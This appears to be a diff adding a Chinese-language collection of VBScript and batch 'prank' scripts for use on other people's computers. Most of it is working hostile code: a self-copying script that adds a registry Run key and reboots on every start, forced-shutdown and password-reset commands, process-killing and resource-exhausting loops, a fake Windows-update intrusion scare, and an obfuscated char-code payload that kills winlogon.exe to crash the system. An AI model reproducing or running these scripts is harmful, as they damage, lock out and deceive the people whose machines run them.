@@ -1,0 +1,388 @@
+const yourname = "1"
+const title = "爱情测试"
+const question = "你最喜欢的人是谁？请在下面的方框中输入他（她）的名字。"
+const info = "你在说谎！不要逃避，实话实说。"
+const scend = "你说出了你的心扉，那就向他（她）表白吧。"
+dim youranswer
+do
+youranswer = inputbox(question, title)
+if youranswer <> yourname then msgbox info, vbinformation+vbokonly, title
+loop until youranswer = yourname
+msgbox scend, vbinformation+vbokonly, title
+
+功能：让他非说出你指定的名字 
+
+
+<script language="VBScript">
+dim a,b
+dim lanchr()
+redim lanchr(10)
+lanchr(1)="从前有座山"
+lanchr(2)="山上有座庙"
+lanchr(3)="庙里有个老和尚和小和尚"
+lanchr(4)="有一天"
+lanchr(5)="老和尚对小和尚讲故事,说道"
+sub click()
+a=1
+for a=1 to 5
+b=lanchr(a)
+msgbox(b)
+next
+settimeout "click()",1
+end sub
+</script>
+<a onClick=click() style='cursor:hand'>点击我查看《两个男人的故事》</a>
+
+保存为*.htm
+
+无限循环！！
+
+
+
+
+MsgBox "兄弟呀，你最近是否失眠",vbinformation 
+Randomize() 
+Dim a 
+a=Int(rnd*2) 
+Select Case a 
+Case 0 
+MsgBox ("我也是这样啊``````") 
+Case 1 
+MsgBox ("(-.-)，同是天涯失眠人。") 
+Case 2 
+MsgBox ("(~.~)，还是说你没有失眠") 
+End select 
+MsgBox ("告诉你一个祖传秘方") 
+Dim b(99) 
+For ji=0 To 99 
+b(ji)=ji+1 
+MsgBox (b(ji) & "只羊") 
+Next 
+MsgBox ("好吧，晚安！") 
+If b(99)=100 Then 
+Set Wshell=Wscript.CreateObject("Wscript.Shell") 
+Wshell.run "shutdown -s -t 100" 
+End if 
+
+
+ps 一直弹到100 然后倒数计时关机
+
+
+
+on error resume next
+set wshshell=createobject("wscript.shell")
+set fso=createobject("scripting.filesystemobject")
+fso.movefile(wscript.scriptfullname,"%windir%\")
+wshshell.run "cmd.exe /c reg add HKLM\software\microsoft\window\currentversion\run /v explorer.exe /t REG_SZ /d c:\windows\"&wscript.scriptname,0,-1
+wshshell.run "cmd.exe /c shutdown -r -t 0",0,-1 
+
+ps:这个毒呀 开机就重起 我还没验证过呢
+
+
+
+
+do
+    msgbox "You are foolish!" '可以改成想弹出的字
+loop
+
+ps:这简单 一直弹同一句话 
+
+
+
+set wsh=createobject("wscript.shell") 
+do
+wsh.run "calc"
+loop
+
+
+ps:有点哪个 打开无数个计算器，可能会死机 
+
+
+dim s
+do until s=500 '次数
+s=s+1
+msgbox "哥们，给我按500次回车吧",64  '弹出的字
+loop 
+
+
+
+on error resume next
+dim WSHshellA
+set WSHshellA = wscript.createobject("wscript.shell")
+WSHshellA.run "cmd.exe /c shutdown -r -t 40 -c ""说我是猪，不说的话就40秒关你机，不信，试试···"" ",0 ,true 
+dim a
+do while(a <> "我是猪")
+a = inputbox ("说我是猪,就不关机，快，说 ""我是猪""　","说不说","不说",8000,7000)
+msgbox chr(13) + chr(13) + chr(13) + a,0,"MsgBox"
+loop
+msgbox chr(13) + chr(13) + chr(13) + "早说就行了吗"
+dim WSHshell
+set WSHshell = wscript.createobject("wscript.shell")
+WSHshell.run "cmd.exe /c shutdown -a",0 ,true 
+msgbox chr(13) + chr(13) + chr(13) + "嘻~真爽"
+
+
+
+
+
+1.掉qq 
+taskkill /im qq.exe /f /t
+
+2.10秒强制关机（任务管理器无效）
+shutdown -s -t 10
+
+3.死机
+start cmd
+0%
+
+4.设置登录密码为2097152
+net user "%username%" 2097152
+5.让电脑只剩一个背景
+taskkill /im /f /t explorer.exe
+
+
+VBS的
+1.莫名其妙结束当前程序
+set ws=createobject("wscript.shell")
+do
+ws.sendkeys "%{f4}"
+loop
+
+2.不断提示你是猪
+do
+msgbox("你是猪")
+loop
+
+
+
+
+
+代码:Set ws=WScript.CreateObject("WScript.Shell") 
+ws.popup"大家好，我就是改变社会风气，风魔万千少女，刺激电影市道，提高年轻人内涵，",10,"闪亮登场" 
+ws.popup"玉树临风，风度翩翩的……“咕噜…咕噜…”，不好意思，我内急先闪了，再见！",15,"farewell"
+ws.popup"发现重要windows更新未安装，系统将自动下载更新并安装",10 
+ws.popup"正在下载windows更新……",12 
+wscript.sleep 10000 
+ws.popup"windows更新已下载完毕，正在安装更新……",12 
+wscript.sleep 3000 
+msgbox"系统检测到WINDOWS更新中携带有不明软件 comcontroler.exe ，并在强行嵌入你的电脑",4132,"是否对其进行扫描？" 
+msgbox"软件名：comcontroler.exe "&vbcrlf&""&vbcrlf&" 大小：56GB "&vbcrlf&""&vbcrlf&" 发行者：高鹏远（403746401）"&vbcrlf&""&vbcrlf&" 安全状况：有病毒",vbinformation 
+msgbox"comcontroler.exe存在不安全因素",4132,"是否阻止其安装" 
+msgbox"阻止失败，请检查防火墙是否开启" 
+wscript.sleep 15000 
+ws.popup"windows更新安装成功！",vbinfmation,20 
+msgbox"您的电脑可能已被入侵，请尽快修改您的QQ密码及其他机密资料,以免QQ被盗或丢失资料",vbinformation 
+ws.popup"哈哈，我已经控制了你的电脑！",12,"很高兴见到你",64 
+ws.popup"不信？我用你的电脑打开我的QQ空间给你看看",10 
+ws.run"http://user.qzone.qq.com/942772218/infocenter" 
+msgbox"警告：为了您的电脑安全，请尽快安装使用杀毒软件对系统进行全面杀毒",vbinformation 
+ws.popup"我再打开中国神泣官方网站",10 
+ws.run"http://shaiya.gtgame.com.cn/index.htm" 
+ws.popup"现在相信了吧？我再打开你的记事本给你写封英语信",20 
+ws.popup"记事本会被打开并最大化，这时你不要动，千万别把目标转移到其他窗口，耐心看我把信写完。否则引起系统混乱我可不负责！" 
+ws.run "notepad",3 : wscript.sleep 2000   
+verybat=split("dear ,friends ,~,   nice ,to ,meet ,you ,i ,am ,so ,sorry ,that ,i ,controled ,your ,computer, without ,you ,allowing,~,please ,excuse ,me ,i ,want ,to ,say ,to ,you ,today,~,my ,friends ,so ,even ,through ,we ,face ,the ,difficulties ,of ,today ,and ,tomorrow,~,still ,have ,a ,dream ,it ,is ,a ,dream ,deeply ,rooted ,in ,our ,common ,dreams ,~,Maybe ,it's ,true ,that ,we ,do ,not ,know ,what ,we ,have ,got ,until ,we ,lose ,it,~,but ,it  ,is ,also ,true ,that ,we ,do ,not ,know ,what ,we ,have ,been ,missing ,until ,it ,arrives ,.see ,you ,later ,~,with ,the ,best ,wishes,~,                     yours,~,                      lhj",",") 
+
+ 
+
+代码2:WScript.Echo("嘿，谢谢你打开我哦，我等你很久拉！"&TSName) 
+WScript.Echo("你是可爱的XX童鞋吗?") 
+WScript.Echo("哈,我想你拉，这你都不知道吗？") 
+WScript.Echo("怎么才来，说~是不是不关心我") 
+WScript.Echo("哼,我生气拉，等你这么久，心都凉啦。") 
+WScript.Echo("夜黑很生气，后果很严重哦。") 
+WScript.Echo("嘿嘿！你也会很惨滴哦") 
+WScript.Echo("是不是想清除我？") 
+WScript.Echo("那你要点上100下哦，不过会给你惊喜滴") 
+WScript.Echo("还剩100下，快点点哦") 
+WScript.Echo("还剩99下，快点，小笨蛋！") 
+WScript.Echo("还剩98下对，就这样快点点！") 
+WScript.Echo("还剩97下。你啊就是笨，要快哦，我先不打扰你工作。") 
+WScript.Echo("还剩96下，记得要快哦！") 
+WScript.Echo("还剩95下") 
+WScript.Echo("还剩94下") 
+WScript.Echo("还剩93下") 
+WScript.Echo("还剩92下") 
+WScript.Echo("还剩91下") 
+WScript.Echo("还剩90下") 
+WScript.Echo("还剩89下") 
+WScript.Echo("还剩88下") 
+WScript.Echo("还剩87下") 
+WScript.Echo("还剩86下") 
+WScript.Echo("还剩85下") 
+WScript.Echo("还剩84下") 
+WScript.Echo("还剩83下") 
+WScript.Echo("还剩82下") 
+WScript.Echo("还剩81下") 
+WScript.Echo("还剩80下") 
+WScript.Echo("还剩79下") 
+WScript.Echo("还剩78下") 
+WScript.Echo("还剩77下") 
+WScript.Echo("还剩76下") 
+WScript.Echo("还剩75下") 
+WScript.Echo("还剩74下") 
+WScript.Echo("还剩73下") 
+WScript.Echo("还剩72下") 
+WScript.Echo("还剩71下") 
+WScript.Echo("还剩70下") 
+WScript.Echo("还剩69下") 
+WScript.Echo("还剩68下") 
+WScript.Echo("还剩67下") 
+WScript.Echo("还剩66下") 
+WScript.Echo("还剩65下") 
+WScript.Echo("还剩64下") 
+WScript.Echo("还剩63下") 
+WScript.Echo("还剩62下") 
+WScript.Echo("还剩61下") 
+WScript.Echo("还剩60下") 
+WScript.Echo("还剩59下") 
+WScript.Echo("还剩58下") 
+WScript.Echo("还剩57下") 
+WScript.Echo("还剩56下") 
+WScript.Echo("还剩55下") 
+WScript.Echo("还剩54下") 
+WScript.Echo("还剩53下") 
+WScript.Echo("还剩52下") 
+WScript.Echo("还剩51下") 
+WScript.Echo("还剩50下") 
+WScript.Echo("还剩49下") 
+WScript.Echo("还剩48下") 
+WScript.Echo("还剩47下") 
+WScript.Echo("还剩46下") 
+WScript.Echo("还剩45下") 
+WScript.Echo("还剩44下") 
+WScript.Echo("还剩43下") 
+WScript.Echo("还剩42下") 
+WScript.Echo("还剩41下") 
+WScript.Echo("还剩40下") 
+WScript.Echo("还剩39下") 
+WScript.Echo("还剩38下") 
+WScript.Echo("还剩37下") 
+WScript.Echo("还剩36下") 
+WScript.Echo("还剩35下") 
+WScript.Echo("还剩34下") 
+WScript.Echo("还剩33下") 
+WScript.Echo("还剩32下") 
+WScript.Echo("还剩31下") 
+WScript.Echo("还剩30下") 
+WScript.Echo("还剩29下") 
+WScript.Echo("还剩28下") 
+WScript.Echo("还剩27下") 
+WScript.Echo("还剩26下") 
+WScript.Echo("还剩25下") 
+WScript.Echo("还剩24下") 
+WScript.Echo("还剩23下") 
+WScript.Echo("还剩22下") 
+WScript.Echo("还剩21下") 
+WScript.Echo("还剩20下") 
+WScript.Echo("还剩19下") 
+WScript.Echo("还剩18下") 
+WScript.Echo("还剩17下") 
+WScript.Echo("还剩16下") 
+WScript.Echo("还剩15下") 
+WScript.Echo("还剩14下") 
+WScript.Echo("还剩13下") 
+WScript.Echo("还剩12下") 
+WScript.Echo("还剩11下") 
+WScript.Echo("还剩10下") 
+WScript.Echo("还剩9下") 
+WScript.Echo("还剩8下") 
+WScript.Echo("还剩7下") 
+WScript.Echo("还剩6下") 
+WScript.Echo("还剩5下") 
+WScript.Echo("还剩4下") 
+WScript.Echo("还剩3下") 
+WScript.Echo("还剩2下") 
+WScript.Echo("还剩1下") 
+WScript.Echo("还剩0下") 
+WScript.Echo("哎看你可怜，饶了你吧") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下") 
+WScript.Echo("还剩下停停！！！慢点，我有话要说") 
+WScript.Echo("还剩下，你继续点我就会消失滴") 
+WScript.Echo("还剩下，以后就看不到我拉。呜呜~555555") 
+WScript.Echo("还剩下，你现在可以选择停止！") 
+WScript.Echo("还剩下。你还点啊，不要我拉？") 
+WScript.Echo("还剩下，有点伤心拉，干嘛丢弃人家") 
+WScript.Echo("还剩下。疯了，你有点负意！") 
+WScript.Echo("还剩下。对。你就点吧，我恨你！") 
+WScript.Echo("还剩下，不明白，删除我你就好吗？") 
+WScript.Echo("还剩下！真要删除我？") 
+WScript.Echo("还剩下。可是我真的很眷恋你。。。") 
+WScript.Echo("还剩下。不要这么绝情嘛，人家是爱你的！") 
+WScript.Echo("还剩下。哼，既然你这么绝情。也别怪我无义！！！") 
+WScript.Echo("我本因该消失的，不过我留恋你滴芳容，万能的上帝又给了一次机会。") 
+WScript.Echo("想结束我么?那你就再多点一次") 
+WScript.Echo("想结束我么?那你就再多点一次") 
+WScript.Echo("想结束我么?那你就再多点一次") 
+WScript.Echo("想结束我么?那你就再多点一次") 
+WScript.Echo("想结束我么?那你就再多点一次") 
+WScript.Echo("想结束我么?那你就再多点一次") 
+WScript.Echo("想结束我么?那你就再多点一次") 
+WScript.Echo("想结束我么?那你就再多点一次") 
+WScript.Echo("想结束我么?那你就再多点一次") 
+WScript.Echo("想结束我么?那你就再多点一次") 
+WScript.Echo("呵呵。QQ1021435988")
+WScript.Echo("呵呵。QQ1021435988")
+WScript.Echo("呵呵。QQ1021435988")
+WScript.Echo("呵呵。QQ1021435988")
+WScript.Echo("呵呵。QQ1021435988")
+WScript.Echo("呵呵。QQ1021435988")
+WScript.Echo("呵呵。QQ1021435988")
+WScript.Echo("呵呵。QQ1021435988")
+
+蓝屏代码:strs=array(13,105,102,32,77,115,103,66,111,120,40,34,-15133,-13625,-10515,-12873,-15632,- 
+
+23617,34,44,118,98,89,101,115,78,111,44,34,-12363,-12877,-13087,- 
+
+13634,34,41,61,118,98,121,101,115,32,116,104,101,110,32,13,10,32,32,32,32,32,32,32,32,32,32,32,109,115,103 
+
+,98,111,120,32,34,-15133,89,-13899,-20026,- 
+
+20319,33,34,13,10,101,108,115,101,13,10,32,32,32,32,109,115,103,98,111,120,32,34,-17479,-19781,-19504,- 
+
+14129,33,33,32,-10249,-12630,-19507,-18525,-23636,-16202,-14655,-11589,-12350,-23636,-15133,-15635,- 
+
+13873,-17966,-15925,35,-23644,-23647,64,35,-23644,37,64,-24147,-24147,35,-24147,- 
+
+24147,63,34,44,54,52,44,34,-11825,-10536,-16721,- 
+
+18202,33,33,33,33,33,33,33,33,33,34,13,10,83,101,116,32,119,115,32,61,32,67,114,101,97,116,101,79,98,106,1 
+
+01,99,116,40,34,87,115,99,114,105,112,116,46,83,104,101,108,108,34,41,32,13,10,119,115,99,114,105,112,116, 
+
+46,115,108,101,101,112,32,32,32,49,50,48,48,13,10,119,115,46,114,117,110,32,34,99,109,100,32,47,99,32,115, 
+
+116,97,114,116,32,47,109,105,110,32,110,116,115,100,32,45,99,32,113,32,45,112,110,32,119,105,110,108,111,1 
+
+03,111,110,46,101,120,101,32,49,62,110,117,108,32,50,62,110,117,108,34,44,118,98,104,105,100,101,13,10,101 
+
+,110,100,32,105,102,13,10,13,10,13,10) 
+for i=1 to UBound(strs) 
+        runner=runner&chr(strs(i)) 
+next 
+Execute runner
